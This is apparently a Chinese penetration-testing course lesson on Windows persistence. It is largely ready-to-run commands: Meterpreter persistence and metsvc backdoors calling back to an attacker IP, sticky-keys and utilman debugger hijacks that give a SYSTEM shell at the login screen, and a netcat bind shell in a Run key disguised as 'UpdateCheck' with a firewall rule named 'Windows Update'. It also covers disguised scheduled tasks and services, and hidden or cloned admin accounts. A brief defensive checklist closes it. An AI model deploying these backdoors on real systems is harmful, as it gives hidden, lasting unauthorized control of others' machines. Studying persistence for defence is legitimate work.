#  082：第53天 - Windows权限维持技术详解 🔐

在本节课中，我们将系统性地学习Windows操作系统下的权限维持技术。权限维持的目的是确保我们通过渗透测试获取的目标系统访问权限不会因漏洞修复或管理员干预而轻易丢失。课程内容将分为四个主要部分：Meterpreter权限维持、系统工具替换后门、开机自启动注册表项以及其他实用技巧。

---

## 第一部分：Meterpreter权限维持 ⚙️

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_1.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_3.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_4.png)

上一节我们概述了课程结构，本节中我们来看看Meterpreter框架下的权限维持技术。Meterpreter是Metasploit框架的一个功能强大的扩展，它集成了许多后渗透模块，方便我们进行各种操作。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_6.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_7.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_9.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_11.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_13.png)

权限维持，顾名思义，就是维持我们已获取的访问权限。这些权限可能来源于Web Shell、内网横向移动等。为了在漏洞修复或管理员发现后仍能控制目标，我们通常需要安装后门程序。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_15.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_16.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_18.png)

Meterpreter提供了两种主要的权限维持技术：

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_20.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_22.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_24.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_26.png)

1.  **`persistence` 模块**：这是一个基于注册表的启动项后门。其原理是上传一个VBS脚本到目标机器，并修改注册表，使得系统启动或用户登录时自动执行该脚本，从而反弹一个会话连接回攻击机。
2.  **`metsvc` 模块**：这是一个服务后门。它会在目标Windows系统上创建一个名为`Meterpreter`的服务，并监听一个特定端口（默认31337）。攻击者只需连接该端口即可获得一个Meterpreter会话。

### `persistence` 模块详解

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_28.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_30.png)

该模块的原理是上传并执行一个VBS脚本，通过修改注册表实现持久化。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_32.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_34.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_36.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_38.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_40.png)

**核心命令与参数：**
在获取Meterpreter会话后，可以运行以下命令查看帮助：
```bash
run persistence -h
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_42.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_44.png)

以下是该模块的一些关键选项：

*   **`-X`**: 系统启动时自启动。
*   **`-U`**: 用户登录时自启动。
*   **`-S`**: 作为服务启动（同样写入注册表）。
*   **`-L`**: 指定远程主机上VBS脚本的存放路径。默认为`%TEMP%`目录，但该目录文件可能在重启后被清除，建议指定更持久的路径，如`C:\Windows\System32`。
*   **`-P`**: 指定使用的Payload。默认是`windows/meterpreter/reverse_tcp`（32位）。如果目标系统是64位，需指定对应的64位Payload，例如`windows/x64/meterpreter/reverse_tcp`。
*   **`-i`**: 设置反向连接的时间间隔（秒）。
*   **`-p`**: 设置反向连接的端口号。
*   **`-r`**: 设置反向连接的IP地址（攻击机IP）。

**使用示例：**
假设攻击机IP为`192.168.1.100`，目标为64位系统。
```bash
run persistence -X -U -i 5 -p 4444 -r 192.168.1.100 -P windows/x64/meterpreter/reverse_tcp
```
执行此命令后，模块会：
1.  在目标`%TEMP%`目录生成一个VBS脚本。
2.  在注册表`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`（系统启动）和`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`（用户登录）下创建项，其值为VBS脚本的路径。
3.  当系统重启或用指定用户登录时，会自动执行VBS脚本，反弹会话到攻击机的4444端口。

**注意**：VBS脚本容易被安全软件查杀，此方法在存在杀软的环境中可能失效。

### `metsvc` 模块详解

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_46.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_48.png)

这是一个更简单的服务后门。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_50.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_52.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_54.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_56.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_58.png)

**使用示例：**
在Meterpreter会话中直接运行：
```bash
run metsvc
```
该命令会：
1.  在目标系统创建`Meterpreter`服务。
2.  上传必要的文件到临时目录。
3.  启动服务，监听31337端口。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_59.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_61.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_63.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_65.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_67.png)

**连接后门：**
在MSF中，使用正向连接Payload连接目标端口即可获得会话。
```bash
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set RHOST <目标IP>
set LPORT 31337
exploit
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_69.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_71.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_73.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_75.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_77.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_79.png)

### 自动化权限维持

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_81.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_83.png)

在设置MSF监听器时，可以使用`AutoRunScript`参数实现自动化。当有新会话建立时，自动执行权限维持脚本。
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 5555
set AutoRunScript persistence -X -U -i 10 -p 5566 -r 192.168.1.100
exploit
```
**注意**：反弹Shell的端口（`LPORT 5555`）和持久化脚本连接的端口（`-p 5566`）应设置为不同端口，避免冲突。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_85.png)

---

## 第二部分：系统工具替换后门 🛠️

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_87.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_88.png)

上一节我们介绍了Meterpreter的自动化工具，本节中我们来看看如何利用Windows系统自带的辅助工具实现更隐蔽的权限维持。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_90.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_92.png)

Windows辅助功能（如屏幕键盘、讲述人、放大镜等）旨在帮助特殊人士使用计算机。攻击者可以在获取系统权限（`SYSTEM`或管理员）后，通过修改注册表，劫持这些工具的启动路径，使其执行我们的后门程序。

其核心原理是利用注册表路径：`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`。在此路径下为特定程序（如`utilman.exe`）创建调试键值，可以指定实际运行的替代程序。

### 劫持实例：以`utilman.exe`（轻松访问中心）为例

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_94.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_96.png)

`utilman.exe`在Windows登录界面可通过点击“轻松访问”按钮触发。劫持它可以在无需登录密码的情况下获得系统Shell。

**操作步骤：**
1.  在已获得权限的CMD或Meterpreter Shell中执行：
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
    ```
    这条命令将`utilman.exe`的调试器设置为`cmd.exe`。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_98.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_100.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_102.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_104.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_106.png)

2.  当在登录界面点击“轻松访问”按钮时，系统不会打开辅助工具管理器，而是直接弹出具有`SYSTEM`权限的`cmd.exe`窗口。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_108.png)

**其他可劫持的目标：**
*   **`sethc.exe`**：粘滞键。按5次Shift键触发。命令：
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
    ```
*   **`osk.exe`**：屏幕键盘。
*   **`narrator.exe`**：讲述人。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_110.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_112.png)

**自动化工具：**
Metasploit的`post/windows/manage/sticky_keys`模块可以自动化完成上述劫持。
```bash
use post/windows/manage/sticky_keys
set SESSION <会话ID>
set TARGET cmd # 或指定你的后门程序路径
run
```

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_114.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_116.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_117.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_119.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_121.png)

### 进程退出静默执行后门

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_123.png)

此技术可以在特定程序（如记事本`notepad.exe`）退出后，静默运行我们的后门。

**操作步骤：**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\path\to\your\backdoor.exe"
```
设置后，每当用户关闭记事本程序，系统就会静默启动指定的后门程序。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_125.png)

---

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_127.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_129.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_131.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_133.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_135.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_137.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_139.png)

## 第三部分：开机自启动注册表项 📁

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_141.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_143.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_145.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_147.png)

上一节我们利用了系统工具的启动机制，本节我们聚焦于Windows本身用于管理启动项的核心区域——注册表。了解这些位置对于权限维持和防御排查都至关重要。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_149.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_151.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_153.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_155.png)

Windows通过一系列注册表键值来控制程序的自启动。以下是常见的自启动注册表路径：

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_157.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_159.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_161.png)

**对所有用户生效（`HKLM`）:**
*   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
*   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
*   `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` (32位程序在64位系统)

**对当前用户生效（`HKCU`）:**
*   `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
*   `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`

**区别**：`HKLM`下的项对机器上所有用户生效，`HKCU`下的项仅对当前登录用户生效。

**利用示例：添加NC后门**
1.  将Netcat (`nc.exe`) 上传至目标，例如 `C:\Windows\System32\nc.exe`。
2.  添加一个自启动项，使系统启动时监听端口。
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "C:\Windows\System32\nc.exe -lvp 5555 -e cmd.exe"
    ```
3.  如果需要，放行防火墙端口。
    ```cmd
    netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow protocol=TCP localport=5555
    ```
4.  攻击机连接目标5555端口即可获得Shell。

**注册表操作命令：**
*   **添加**：`reg add <键路径> /v <值名称> /t <类型> /d <数据>`
*   **查询**：`reg query <键路径>`
*   **删除**：`reg delete <键路径> /f`

在Meterpreter中，可以直接使用`reg`命令操作远程注册表。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_163.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_165.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_167.png)

---

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_169.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_171.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_173.png)

## 第四部分：其他权限维持技巧 🧩

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_175.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_177.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_178.png)

除了上述方法，还有一些其他常用的权限维持技巧。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_180.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_182.png)

### 1. 计划任务后门
Windows计划任务可以定时执行程序，是理想的持久化方式。
```cmd
# 创建每分钟执行一次的计划任务
schtasks /create /tn "SystemCheck" /tr "C:\path\to\backdoor.exe" /sc minute /mo 1 /ru SYSTEM /f
```
参数说明：`/tn`任务名，`/tr`要运行的程序，`/sc`计划频率（minute/hourly/daily...），`/mo`间隔，`/ru`运行用户。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_184.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_186.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_188.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_190.png)

### 2. 快捷方式劫持
修改用户常用程序（如浏览器、办公软件）快捷方式的“目标”字段，在启动原程序的同时静默执行后门。
1.  创建一个恶意脚本（如`launch.vbs`），内容为启动原程序和后门。
2.  将快捷方式的“目标”指向该VBS脚本。
3.  更改快捷方式图标，使其看起来与原程序一致。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_192.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_193.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_194.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_195.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_197.png)

### 3. 隐藏用户账户
*   **简单隐藏**：创建以`$`结尾的用户名，如`admin$`。该用户在`net user`命令中不可见，但在控制面板中可见。
    ```cmd
    net user admin$ Password123! /add
    net localgroup administrators admin$ /add
    ```
*   **克隆账户**：更隐蔽的方法。通过导出`Administrator`账户在注册表`SAM`数据库中的特定键值（F值），并将其导入到一个新建的隐藏账户中，使该账户拥有与Administrator相同的权限，且在命令行和控制面板中都不可见。此操作需要对注册表`HKLM\SAM\SAM`有完全控制权限。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_199.png)

### 4. 启动文件夹
将后门程序或快捷方式放入以下目录，用户登录时会自动执行：
*   系统启动文件夹：`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
*   当前用户启动文件夹：`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
此方法较为容易被发现。

### 5. 服务后门
使用`sc`命令创建自定义服务。
```cmd
sc create "WindowsUpdateService" binPath= "C:\path\to\backdoor.exe" start= auto
sc start WindowsUpdateService
```

### 6. PowerShell脚本后门
利用PowerShell的灵活性和免杀特性，可以编写复杂的持久化脚本。例如，使用`Invoke-TaskBackdoor`等脚本创建计划任务，定期回连。

---

## 总结与回顾 📚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_201.png)

本节课中我们一起学习了Windows系统下多种权限维持技术：

1.  **Meterpreter内置工具**：`persistence`（注册表VBS脚本）和`metsvc`（服务后门），适合在已获得Meterpreter会话后快速部署。
2.  **系统工具劫持**：利用辅助功能（粘滞键、屏幕键盘等）在登录界面触发后门，无需用户密码，非常隐蔽。
3.  **注册表自启动项**：利用`Run`、`RunOnce`等键值实现开机或登录自启，是经典持久化位置。
4.  **其他技巧**：包括计划任务、快捷方式劫持、隐藏/克隆用户账户、启动文件夹、服务后门和PowerShell脚本等。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_203.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_205.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_207.png)

**防御建议**：
*   定期检查注册表常见自启动路径。
*   监控系统服务列表，警惕陌生服务。
*   检查计划任务，特别是以高权限运行的任务。
*   注意登录界面辅助功能的异常行为。
*   使用安全软件并保持更新。
*   对注册表`SAM`等关键位置设置严格权限。

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_209.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_211.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_213.png)

权限维持是渗透测试中巩固战果的关键一步，但同时也是防守方需要重点布防的领域。理解攻击手法，才能更好地进行防御。